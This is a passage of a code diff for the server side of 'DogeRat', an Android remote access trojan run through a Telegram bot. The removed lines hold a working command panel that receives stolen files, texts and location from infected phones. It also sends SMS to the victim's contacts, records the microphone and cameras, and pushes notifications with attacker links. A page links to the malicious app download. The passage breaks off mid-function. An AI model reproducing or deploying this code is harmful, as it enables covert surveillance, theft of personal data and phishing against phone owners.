@@ -1,726 +1,572 @@
-const express = require('express');
-const webSocket = require('ws');
-const http = require('http')
-const telegramBot = require('node-telegram-bot-api')
-const uuid4 = require('uuid')
-const multer = require('multer');
-const bodyParser = require('body-parser')
-const axios = require("axios");
+const WebSocket = require("ws");
+const TelegramBot = require("node-telegram-bot-api");
+const express = require("express");
+const multer = require("multer");
+const path = require("path");
+const fs = require("fs");
+require("dotenv").config();
 
-// Replit Secrets se token aur id fetch karna
-const token = process.env.BOT_TOKEN;
-const id = process.env.CHAT_ID;
-
-// Yeh check karega ki agar token ya id missing hai toh error show kare
-if (!token || !id) {
-  console.error("Error: BOT_TOKEN ya CHAT_ID secret set nahi hai!");
-}
-const address = 'https://www.google.com'
-
+const appServer = express();
+const appSocket = new WebSocket.Server({ noServer: true });
+const appBot = new TelegramBot(process.env.TOKEN, { polling: true });
 const app = express();
-const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(token, {polling: true});
-const appClients = new Map()
+const upload = multer({ dest: "uploads/" });
+let appClients = new Map();
+let id = process.env.ID;
+let currentUuid = null;
+let currentNumber = null;
+let currentTitle = null;
+let currentPath = "/"; // File manager current path
+let fileManagerState = new Map(); // Track file manager sessions per device
 
-const upload = multer();
-app.use(bodyParser.json());
+app.use(express.static("public"));
+app.use(express.json({ limit: "50mb" }));
+app.use("/uploads", express.static("uploads"));
 
-let currentUuid = ''
-let currentNumber = ''
-let currentTitle = ''
+// File Manager State Management
+function getFileManagerKeyboard(uuid, path) {
+  return {
+    inline_keyboard: [
+      [{ text: `📁 Back to ${path.split('/').slice(0,-1).join('/') || '/' }`, callback_data: `fm_back:${uuid}:${path}` }],
+      [{ text: `📂 Refresh`, callback_data: `fm_refresh:${uuid}:${path}` }],
+      [{ text: `📱 Home`, callback_data: `fm_home:${uuid}` }]
+    ]
+  };
+}
 
-app.get('/', function (req, res) {
-    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1> <br> <p style="font-size:16px; text-align:center; color:red;">Doge Rat App ➩ <a style="text-decoration: none;" href="https://github.com/Master-xyx/FreeApp/raw/refs/heads/main/DogeApps.zip">Download</a></p> <br><br> <p style="font-size:36px; text-align:center; color:red;">Subscribe 🔔 ➩ <a style="color:green; text-decoration: none;" href="https://youtube.com/@hackedtips">My YT Channel</a></p>')
-})
-
-app.post("/uploadFile", upload.single('file'), (req, res) => {
-    const name = req.file.originalname
-    appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
-            parse_mode: "HTML"
-        },
-        {
-            filename: name,
-            contentType: 'application/txt',
-        })
-    res.send('')
-})
-app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
-    res.send('')
-})
-app.post("/uploadLocation", (req, res) => {
-    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
-    res.send('')
-})
-appSocket.on('connection', (ws, req) => {
-    const uuid = uuid4.v4()
-    const model = req.headers.model
-    const battery = req.headers.battery
-    const version = req.headers.version
-    const brightness = req.headers.brightness
-    const provider = req.headers.provider
-
-    ws.uuid = uuid
-    appClients.set(uuid, {
-        model: model,
-        battery: battery,
-        version: version,
-        brightness: brightness,
-        provider: provider
-    })
-    appBot.sendMessage(id,
-        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
-        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
-        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
-        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
-        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-        {parse_mode: "HTML"}
-    )
-    ws.on('close', function () {
-        appBot.sendMessage(id,
-            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
-            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
-            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
-            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
-            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-            {parse_mode: "HTML"}
-        )
-        appClients.delete(ws.uuid)
-    })
-})
-appBot.on('message', (message) => {
-    const chatId = message.chat.id;
-    if (message.reply_to_message) {
-        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
-            currentNumber = message.text
-            appBot.sendMessage(id,
-                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
-                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
-                {reply_markup: {force_reply: true}}
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`send_message:${currentNumber}/${message.text}`)
-                }
-            });
-            currentNumber = ''
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
-            const message_to_all = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`send_message_to_all:${message_to_all}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
-            const path = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`file:${path}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
-            const path = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`delete_file:${path}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
-            const duration = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`microphone:${duration}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
-            const duration = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`rec_camera_main:${duration}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
-            const duration = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`rec_camera_selfie:${duration}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
-            const toastMessage = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`toast:${toastMessage}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            const notificationMessage = message.text
-            currentTitle = notificationMessage
-            appBot.sendMessage(id,
-                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
-                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
-                {reply_markup: {force_reply: true}}
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            const link = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`show_notification:${currentTitle}/${link}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
-            const audioLink = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`play_audio:${audioLink}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-    }
-    if (id == chatId) {
-        if (message.text == '/start') {
-            appBot.sendMessage(id,
-                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
-                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
-                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
-                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
-            if (appClients.size == 0) {
-                appBot.sendMessage(id,
-                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
-                )
-            } else {
-                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
-                appClients.forEach(function (value, key, map) {
-                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
-                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
-                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
-                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
-                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
-                })
-                appBot.sendMessage(id, text, {parse_mode: "HTML"})
-            }
-        }
-        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
-            if (appClients.size == 0) {
-                appBot.sendMessage(id,
-                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
-                )
-            } else {
-                const deviceListKeyboard = []
-                appClients.forEach(function (value, key, map) {
-                    deviceListKeyboard.push([{
-                        text: value.model,
-                        callback_data: 'device:' + key
-                    }])
-                })
-                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
-                    "reply_markup": {
-                        "inline_keyboard": deviceListKeyboard,
-                    },
-                })
-            }
-        }
-    } else {
-        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
-    }
-})
-appBot.on("callback_query", (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const data = callbackQuery.data
-    const commend = data.split(':')[0]
